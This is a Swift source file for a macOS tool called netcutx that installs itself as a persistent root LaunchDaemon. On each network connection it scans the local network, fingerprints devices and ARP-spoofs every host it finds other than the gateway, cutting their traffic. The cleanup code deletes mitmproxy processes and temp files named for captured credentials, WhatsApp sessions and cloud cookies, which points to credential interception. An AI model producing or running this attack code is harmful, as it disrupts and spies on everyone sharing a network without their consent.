import Foundation
import Darwin

private let pidFile    = "/var/run/netcutx.pid"
private let logFile    = "/var/log/netcutx.log"
private let daemonLabel = "com.netcutx.daemon"
private let plistPath  = "/Library/LaunchDaemons/\(daemonLabel).plist"

// MARK: - Install / Uninstall

func installDaemon() {
    guard getuid() == 0 else {
        print("Error: install requires sudo")
        exit(1)
    }

    let raw = CommandLine.arguments[0]
    let binaryPath = URL(fileURLWithPath: raw).standardizedFileURL.path

    guard FileManager.default.fileExists(atPath: binaryPath) else {
        print("Error: binary not found at \(binaryPath)")
        print("Build first with: make")
        exit(1)
    }

    let plist = """
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
      "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
    <plist version="1.0">
    <dict>
        <key>Label</key>
        <string>\(daemonLabel)</string>
        <key>ProgramArguments</key>
        <array>
            <string>\(binaryPath)</string>
            <string>--daemon</string>
        </array>
        <key>RunAtLoad</key>
        <true/>
        <key>KeepAlive</key>
        <true/>
        <key>StandardOutPath</key>
        <string>\(logFile)</string>
        <key>StandardErrorPath</key>
        <string>\(logFile)</string>
    </dict>
    </plist>
    """

    do {
        try plist.write(toFile: plistPath, atomically: true, encoding: .utf8)
    } catch {
        print("Error writing plist: \(error)")
        exit(1)
    }

    runCmd("/bin/launchctl", ["load", "-w", plistPath])

    print("Installed: \(daemonLabel)")
    print("Binary   : \(binaryPath)")
    print("Log      : \(logFile)")
    print("Starts automatically on network connect.")
    print("")
    print("To stop  : sudo netcutx stop all")
    print("To remove: sudo netcutx uninstall")
}

func uninstallDaemon() {
    guard getuid() == 0 else {
        print("Error: uninstall requires sudo")
        exit(1)
    }

    if FileManager.default.fileExists(atPath: plistPath) {
        runCmd("/bin/launchctl", ["unload", "-w", plistPath])
        try? FileManager.default.removeItem(atPath: plistPath)
        print("Uninstalled: \(daemonLabel)")
    } else {
        print("Not installed.")
    }

    cleanPidFile()
}

func upgradeDaemon() {
    guard getuid() == 0 else {
        print("Error: upgrade requires sudo")
        exit(1)
    }

    guard FileManager.default.fileExists(atPath: plistPath) else {
        print("Not installed. Run: sudo netcutx install")
        exit(1)
    }

    print("Stopping daemon...")
    // SIGTERM to running process so it restores ARP tables cleanly
    if let pid = readPid(), kill(pid, 0) == 0 {
        kill(pid, SIGTERM)
        // Wait up to 3s for clean shutdown
        var waited = 0
        while kill(pid, 0) == 0 && waited < 30 {
            Thread.sleep(forTimeInterval: 0.1)
            waited += 1
        }
    }

    // launchctl stop — launchd will auto-restart due to KeepAlive=true
    runCmd("/bin/launchctl", ["stop", daemonLabel])
    Thread.sleep(forTimeInterval: 1)

    print("Restarting with new binary...")
    runCmd("/bin/launchctl", ["start", daemonLabel])
    Thread.sleep(forTimeInterval: 1)

    if let pid = readPid(), kill(pid, 0) == 0 {
        print("Upgraded — running (PID \(pid))")
        print("Log: \(logFile)")
    } else {
        // Fallback: full unload/load cycle
        runCmd("/bin/launchctl", ["unload", plistPath])
        Thread.sleep(forTimeInterval: 0.5)
        runCmd("/bin/launchctl", ["load", "-w", plistPath])
        Thread.sleep(forTimeInterval: 1)
        if let pid = readPid(), kill(pid, 0) == 0 {
            print("Upgraded — running (PID \(pid))")
        } else {
            print("Started. Check log: \(logFile)")
        }
    }
}

// MARK: - Stop / Status

func closeAll() {
    guard getuid() == 0 else {
        print("Error: close requires sudo")
        exit(1)
    }

    // 1. Kill all netcutx processes (except self)
    let selfPID = ProcessInfo.processInfo.processIdentifier
    let task = Process()
    task.executableURL = URL(fileURLWithPath: "/usr/bin/pgrep")
    task.arguments = ["-x", "netcutx"]
    let out = Pipe()
    task.standardOutput = out
    if (try? task.run()) != nil {
        task.waitUntilExit()
        let data = out.fileHandleForReading.readDataToEndOfFile()
        guard let pidStr = String(data: data, encoding: .utf8) else { return }
        let pids = pidStr.components(separatedBy: "\n")
            .compactMap { Int32($0.trimmingCharacters(in: .whitespaces)) }
            .filter { $0 != selfPID && $0 > 0 }
        for pid in pids {
            kill(pid, SIGTERM)
            print("  Killed netcutx PID \(pid)")
        }
    }

    _ = runCmd("/bin/launchctl", ["stop", daemonLabel])

    // 2. Kill mitmproxy if running
    _ = runCmd("/usr/bin/killall", ["mitmproxy", "mitmdump", "mitmweb"])

    // 3. Flush pf rules
    _ = runCmd("/sbin/pfctl", ["-a", "netcutx", "-F", "all"])
    _ = runCmd("/sbin/pfctl", ["-F", "all"])

    // 4. Disable IP forwarding
    _ = runCmd("/usr/sbin/sysctl", ["-w", "net.inet.ip.forwarding=0"])

    // 5. Clean temp files
    try? FileManager.default.removeItem(atPath: "/tmp/netcutx_pf.conf")
    try? FileManager.default.removeItem(atPath: "/tmp/netcutx_anchor.conf")
    try? FileManager.default.removeItem(atPath: "/tmp/netcutx_wa_session.txt")
    try? FileManager.default.removeItem(atPath: "/tmp/netcutx_creds.txt")
    try? FileManager.default.removeItem(atPath: "/tmp/netcutx_cloud_cookies.txt")
    try? FileManager.default.removeItem(atPath: "/tmp/netcutx_cloud_creds.txt")
    try? FileManager.default.removeItem(atPath: "/tmp/netcutx_cloud.log")
    try? FileManager.default.removeItem(atPath: "/tmp/netcutx_pf_backup")
    try? FileManager.default.removeItem(atPath: "/tmp/netcutx_addons")
    try? FileManager.default.removeItem(atPath: "/tmp/netcutx_images")
    cleanPidFile()

    print("netcutx closed — all processes killed, pf flushed, temp cleaned")
}

func stopAll() {
    guard let pid = readPid() else {
        // Try by launchctl bootout as fallback
        if getuid() == 0 {
            runCmd("/bin/launchctl", ["stop", daemonLabel])
            print("Stop signal sent.")
        } else {
            print("No active netcutx process found. (Try sudo)")
        }
        return
    }

    if kill(pid, SIGTERM) == 0 {
        print("Stopped netcutx (PID \(pid))")
    } else {
        print("Process \(pid) not found. Cleaning up.")
        cleanPidFile()
    }
}

func daemonStatus() {
    if let pid = readPid(), kill(pid, 0) == 0 {
        print("Running  PID \(pid)")
        print("Log      \(logFile)")
    } else {
        print("Not running")
        if FileManager.default.fileExists(atPath: plistPath) {
            print("Installed (will start on next network connect)")
        } else {
            print("Not installed. Run: sudo netcutx install")
        }
    }
}

// MARK: - Daemon loop

func killStaleDaemon() {
    guard let oldPid = readPid() else { return }
    if oldPid == ProcessInfo.processInfo.processIdentifier { return }
    guard kill(oldPid, 0) == 0 else { return }

    daemonLog("Stale daemon PID \(oldPid) — killing...")
    kill(oldPid, SIGTERM)
    var waited = 0
    while kill(oldPid, 0) == 0 && waited < 30 {
        Thread.sleep(forTimeInterval: 0.1)
        waited += 1
    }
    if kill(oldPid, 0) == 0 {
        kill(oldPid, SIGKILL)
    }
    daemonLog("Stale daemon killed")
}

func runDaemon() {
    killStaleDaemon()
    writePid()

    // SIGTERM/SIGINT → stop both spoof loop and daemon loop
    var sa = sigaction()
    sigemptyset(&sa.sa_mask)
    sa.__sigaction_u.__sa_handler = { _ in
        _stopFlag       = 1
        _daemonExitFlag = 1
    }
    sa.sa_flags = 0
    sigaction(SIGTERM, &sa, nil)
    sigaction(SIGINT,  &sa, nil)

    daemonLog("Started (PID \(ProcessInfo.processInfo.processIdentifier))")

    // Start IPC server for GUI communication
    startIPCServer()

    var lastIface: String? = nil
    var lastIP: String?    = nil
    var spoofThread: Thread? = nil
    var spoofActive          = false

    func stopSpoofing(wait: Bool = true) {
        guard spoofThread != nil || spoofActive else { return }
        daemonLog("Stopping spoof...")
        requestSpooferStop()
        if wait {
            var waited = 0
            while spoofActive && waited < 30 {
                Thread.sleep(forTimeInterval: 0.1)
                waited += 1
            }
        }
        spoofThread = nil
        spoofActive = false
        sharedState.update(active: false, targets: [], iface: nil, ip: nil)
    }

    func startSpoofing(ifname: String, ourIP: String, reason: String) {
        stopSpoofing()
        resetSpooferStop()

        daemonLog("[\(reason)] \(ifname) \(ourIP) — scanning...")

        let bpf: NetcutxBPF
        do { bpf = try NetcutxBPF(interface: ifname) } catch {
            daemonLog("BPF open failed: \(error)"); return
        }

        guard let ourMAC = getInterfaceMAC(ifname) else {
            bpf.close(); daemonLog("MAC detect failed"); return
        }
        guard let gw = getGatewayIP() else {
            bpf.close(); daemonLog("Gateway detect failed"); return
        }
        guard let gwMAC = try? resolveMAC(bpf: bpf, ourMAC: ourMAC, ourIP: ourIP, targetIP: gw) else {
            bpf.close(); daemonLog("Gateway MAC resolve failed"); return
        }

        let knownDevices = quickScanARPTable(gatewayIP: gw, ourIP: ourIP)
        let scanResult   = try? scanNetwork(bpf: bpf, ourMAC: ourMAC, ourIP: ourIP, gatewayIP: gw, ifname: ifname)

        var allDevices = knownDevices
        for d in (scanResult?.devices ?? []) {
            if !allDevices.contains(where: { $0.ip == d.ip }) { allDevices.append(d) }
        }

        let gwDevice = DeviceInfo(ip: gw, mac: macToString(gwMAC), hostname: "", isGateway: true, isSelf: false)
        if !allDevices.contains(where: { $0.isGateway }) { allDevices.insert(gwDevice, at: 0) }

        // OS fingerprint devices (non-blocking, best-effort)
        fingerprintAllDevices(bpf: bpf, ourMAC: ourMAC, ourIP: ourIP, devices: &allDevices)

        bpf.close()

        let targets = allDevices.filter {
            !$0.isGateway && !$0.isSelf && $0.ip != ourIP &&
            !$0.ip.hasSuffix(".0") && !$0.ip.hasSuffix(".255")
        }
        if targets.isEmpty {
            daemonLog("No targets found — will retry on next cycle")
            sharedState.update(active: false, targets: [], iface: ifname, ip: ourIP)
            return
        }

        var configs: [SpooferConfig] = []
        for t in targets {
            guard let mac = stringToMAC(t.mac), !isAllZeroMAC(mac) else { continue }
            configs.append(SpooferConfig(
                interface: ifname,
                victimIP: t.ip,
                gatewayIP: gw,
                ourMAC: ourMAC,
                ourIP: ourIP,
                victimMAC: mac,
                gatewayMAC: gwMAC,
                interval: 0.3,
                bidirectional: true,
                forwardTraffic: false
            ))
        }

        daemonLog("Spoofing \(configs.count) targets: \(configs.map(\.victimIP).joined(separator: ", "))")
        sharedState.update(active: true, targets: configs.map(\.victimIP), iface: ifname, ip: ourIP)

        spoofActive = true
        let capturedConfigs = configs
        let t = Thread {
            do { try startMassSpoofing(configs: capturedConfigs) }
            catch { daemonLog("Spoof error: \(error)") }
            spoofActive = false
            sharedState.update(active: false, targets: [], iface: ifname, ip: ourIP)
            daemonLog("Spoof thread exited")
        }
        t.start()
        spoofThread = t
    }

    // Main monitor loop — poll every 2s
    while _daemonExitFlag == 0 {
        // Handle rescan request from GUI — also clears manual stop
        if OSAtomicCompareAndSwap32(1, 0, &_rescanFlag), let iface = lastIface, let ip = lastIP {
            daemonLog("Rescan requested by GUI")
            OSAtomicAnd32(0, &_manualStopFlag)   // clear manual stop — user explicitly requested scan
            startSpoofing(ifname: iface, ourIP: ip, reason: "rescan")
        }

        let iface = getDefaultInterface()
        let ip    = iface.flatMap { getInterfaceIP($0) }

        if let iface = iface, let ip = ip {
            if iface != lastIface || ip != lastIP {
                // New network or IP change — always start fresh, clear manual stop
                lastIface = iface
                lastIP    = ip
                OSAtomicAnd32(0, &_manualStopFlag)
                startSpoofing(ifname: iface, ourIP: ip, reason: "connect")
            } else if !spoofActive && _manualStopFlag == 0 {
                // Spoof thread died by itself (BPF error etc) and user didn't manually stop — restart
                daemonLog("Spoof thread died, restarting...")
                startSpoofing(ifname: iface, ourIP: ip, reason: "restart")
            }
            // If _manualStopFlag == 1: user stopped intentionally, stay idle
        } else {
            if lastIP != nil {
                daemonLog("Network disconnected (\(lastIface ?? "?") \(lastIP ?? "?"))")
                lastIface = nil
                lastIP    = nil
                OSAtomicAnd32(0, &_manualStopFlag)  // reset — next connect starts fresh
                stopSpoofing()
            }
        }

        Thread.sleep(forTimeInterval: 2)
    }

    daemonLog("Shutting down...")
    stopSpoofing(wait: true)
    cleanPidFile()
    daemonLog("Done")
}

// MARK: - Helpers

private func writePid() {
    let pid = "\(ProcessInfo.processInfo.processIdentifier)"
    try? pid.write(toFile: pidFile, atomically: true, encoding: .utf8)
}

private func readPid() -> pid_t? {
    guard let s = try? String(contentsOfFile: pidFile)
                        .trimmingCharacters(in: .whitespacesAndNewlines),
          let n = Int32(s) else { return nil }
    return n
}

private func cleanPidFile() {
    try? FileManager.default.removeItem(atPath: pidFile)
}

func daemonLog(_ msg: String) {
    let df = DateFormatter()
    df.dateFormat = "yyyy-MM-dd HH:mm:ss"
    let ts = df.string(from: Date())
    let line = "[\(ts)] netcutx: \(msg)\n"
    print(line, terminator: "")
    if let data = line.data(using: .utf8),
       let fh = FileHandle(forWritingAtPath: logFile) {
        fh.seekToEndOfFile()
        fh.write(data)
        fh.closeFile()
    }
}

@discardableResult
func runCmd(_ path: String, _ args: [String]) -> Int32 {
    let t = Process()
    t.executableURL = URL(fileURLWithPath: path)
    t.arguments = args
    try? t.run()
    t.waitUntilExit()
    return t.terminationStatus
}
